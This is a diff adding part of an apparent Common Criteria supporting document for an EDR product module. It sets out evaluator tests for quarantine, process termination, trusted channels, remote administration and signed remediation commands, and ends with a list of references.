+                  documented capabilities to perform the management functions.<div class='eacategory'>Tests</div>The evaluator shall perform the below tests:
+                  <ul>
+                    <li><b>Test 1: </b>Conditional: If logically quarantining the endpoint from the network is selected 
+                      the evaluator shall logically quarantine a managed endpoint system from the
+                    network and verify that the system is unable to access network addresses or resources
+                    outside of a whitelist.</li>
+                    <li><b>Test 2: </b>Conditional: If quarantining the malicious file on the endpoint is selected 
+                      the evaluator shall verify the functionality to quarantine potentially unauthorized files on the endpoint.</li>
+                    <li><b>Test 3: </b>The evaluator shall run an executable on a managed endpoint system and terminate
+                    its process from the EDR management dashboard before verifying that the process is no
+                    longer running on the system.</li>
+                    <li><b>Test 4: </b>The evaluator shall place a file known to trigger an incident alert on the file system then retrieve the 
+                      contents of the file from the EDR management dashboard.</li>
+                  </ul>
+                </div><h3 data-level='2' id='ftp' class='indexable'>2.1.6 Trusted Path/Channels (FTP)</h3><div id='FTP_ITC.1' class='comp'><h4>FTP_ITC.1 Trusted Channel (Host Agent)</h4><div class='eacategory'>TSS</div> If EDR shall leverage the platform was selected, the evaluator shall verify the TSS contains the calls to the platform that TOE is leveraging to invoke the functionality.<br/><br/> 
+	
+			
+			If EDR was selected, the evaluator shall examine the TSS to verify how Agent-Server communications are protected is described and conforms to the SFR. 
+                  The evaluator shall also confirm that all protocols
+                  listed in the TSS are consistent with those specified in the requirement, and are
+                  included in the requirements in the ST. <div class='eacategory'>Guidance</div> The evaluator shall confirm that the operational guidance contains
+                  instructions for configuring the communication channel between the Host Agent and
+                  the EDR for each supported method. 
+                <div class='eacategory'>Tests</div>
+                  <ul>
+                    <li><b>Test 1: </b> The evaluators shall ensure that communications using each specified
+                        (in the operational guidance) Agent-Server communication method is tested
+                        during the course of the evaluation, setting up the connections as described
+                        in the operational guidance and ensuring that communication is successful. </li>
+                    <li><b>Test 2: </b> The evaluator shall ensure, for each method of Agent-Server
+                        communication, the channel data is not sent in plaintext. </li>
+                    </ul>
+                  </div><div id='FTP_TRP.1' class='comp'><h4>FTP_TRP.1 Trusted Path (for Remote Administration)</h4><div class='eacategory'>TSS</div> The evaluator shall examine the TSS to verify how remote administration communications are protected is described and conforms to the SFR. 
+                  The evaluator shall examine the TSS to determine that the
+                  methods of remote TOE administration are indicated, along with
+                  how those communications are protected. The evaluator shall also confirm that all
+                  protocols listed in the TSS in support of TOE
+                  administration are consistent with those specified in the requirement, and are
+                  included in the requirements in the ST.
+		      
+		      <br/><br/> If EDR shall leverage the platform was selected, the evaluator shall verify the TSS contains the calls to the platform that TOE is leveraging to invoke the functionality.
+	<div class='eacategory'>Guidance</div> The evaluator shall confirm that the operational guidance contains
+                  instructions for establishing the remote administrative sessions for each
+                  supported method. <div class='eacategory'>Tests</div>
+                    <ul>
+                      <li><b>Test 1: </b> The evaluators shall ensure that communications using each specified
+                        (in the operational guidance) remote administration method is tested during
+                        the course of the evaluation, setting up the connections as described in the
+                        operational guidance and ensuring that communication is successful. </li>
+                      <li><b>Test 2: </b> For each method of remote administration supported, the evaluator shall
+                        follow the operational guidance to ensure that there is no available
+                        interface that can be used by a remote user to establish remote
+                        administrative sessions without invoking the trusted path. </li>
+                      <li><b>Test 3: </b> The evaluator shall ensure, for each method of remote administration,
+                        the channel data is not sent in plaintext. </li>
+                    </ul>
+                  </div><h1 data-level='0' id='opt-sfrs' class='indexable'>3 Evaluation Activities for Optional SFRs</h1>The PP-Module does not define any optional requirements.<h1 data-level='0' id='sel-sfrs' class='indexable'>4 Evaluation Activities for Selection-Based SFRs</h1>The PP-Module does not define any selection-based requirements.<h1 data-level='0' id='obj-sfrs' class='indexable'>5 Evaluation Activities for Objective SFRs</h1><h3 data-level='1' id='fmt' class='indexable'>5.1 Security Management (FMT)</h3><div id='FMT_TRM_EXT.1' class='comp'><h4>FMT_TRM_EXT.1 Trusted Remediation Functions</h4><div class='eacategory'>TSS</div>The evaluator shall check to ensure that the TSS describes how all commands and policies are signed.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance and ensure that the
+                EDR any configuration information for policy signing is included.
+              <div class='eacategory'>Tests</div>The evaluator shall select any one remediation function documented in the
+                administrative guide (e.g., terminate process), and execute that command
+                while capturing traffic. The evaluator shall review captured network traffic and
+                verify that a digital signature was sent along with the coinciding command or policy update.
+                The EDR may need to be configured in a manner to disable transport
+                encryption for this test or the network capture tool may need to be
+                configured with the private key such that decrypted traffic can be made
+                available to the evaluator.
+              </div><h1 data-level='0' id='sar_aas' class='indexable'>6 Evaluation Activities for SARs</h1><p>The PP-Module does not define any SARs beyond those defined within the
+    App PP base to which it must claim conformance.
+	It is important to note that a TOE that is evaluated against the PP-Module is
+	inherently evaluated against this Base-PP as well. 
+	The App PP includes a number of Evaluation Activities associated with both SFRs and SARs.
+	Additionally, the PP-Module includes a number of SFR-based Evaluation Activities 
+	that similarly refine the SARs of the Base-PPs.
+	The evaluation laboratory will evaluate the TOE against the Base-PP
+      
+    and supplement that evaluation with the necessary SFRs that are taken from the PP-Module.
+    </p><h1 data-level='0' id='sup-info' class='indexable'>7 Required Supplementary Information</h1><p>This Supporting Document has no required supplementary information beyond the ST, operational
+guidance, and testing.</p><h1 data-level='A' id='biblio' class='indexable'>Appendix A -  References</h1><table><tr class='header'><th>Identifier</th><th>Title</th></tr>
+    <tr><td><span id='bibCC'> [CC] </span></td><td>Common Criteria for Information Technology Security Evaluation - <ul><li><a href='http://www.commoncriteriaportal.org/files/ccfiles/CCPART1V3.1R5.pdf'>Part
+                1: Introduction and General Model</a>, CCMB-2017-04-001, Version 3.1 Revision 5,
+              April 2017.</li><li><a href='http://www.commoncriteriaportal.org/files/ccfiles/CCPART2V3.1R5.pdf'>Part
+                2: Security Functional Components</a>, CCMB-2017-04-002, Version 3.1 Revision 5,
+              April 2017.</li><li><a href='http://www.commoncriteriaportal.org/files/ccfiles/CCPART3V3.1R5.pdf'>Part
+                3: Security Assurance Components</a>, CCMB-2017-04-003, Version 3.1 Revision 5,
+              April 2017.</li></ul></td></tr>
+    <tr><td><span id='bibAppPP'></span>[AppPP]</td><td>
+        <a href='https://www.niap-ccevs.org/pp/PP_APP_v1.3/'>Protection Profile for Application
+          Software</a>
+      </td></tr>
+    <tr><td><span id='bibHAGT'></span>[Host Agent]</td><td>
+        <a href='https://commoncriteria.github.io/pp/esm-hostagent/esm-hostagent-release.html'>Module for ESM Host Agent, Version 1.0, July 2019</a>
+      </td></tr>
+    
+  </table></body></html>
